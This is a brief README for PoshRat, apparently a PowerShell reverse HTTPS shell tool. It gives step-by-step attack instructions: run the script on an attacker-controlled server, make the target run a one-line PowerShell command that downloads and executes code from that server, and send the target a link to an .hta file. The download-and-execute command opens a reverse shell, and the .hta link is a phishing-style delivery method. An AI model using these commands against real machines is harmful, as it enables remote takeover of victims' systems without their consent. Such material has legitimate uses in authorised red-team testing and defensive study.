PoshRat
=======

PowerShell Reverse HTTPs Shell

1. Invoke PoshRat.ps1 On An Atacker Controlled Server
2. To Spawn The Reverse Shell Run On Client

   iex (New-Object Net.WebClient).DownloadString("http://[ServerIP]/connect")
3. Browse to or send link to [serverip]/app.hta

Created By Casey Smith @subTee
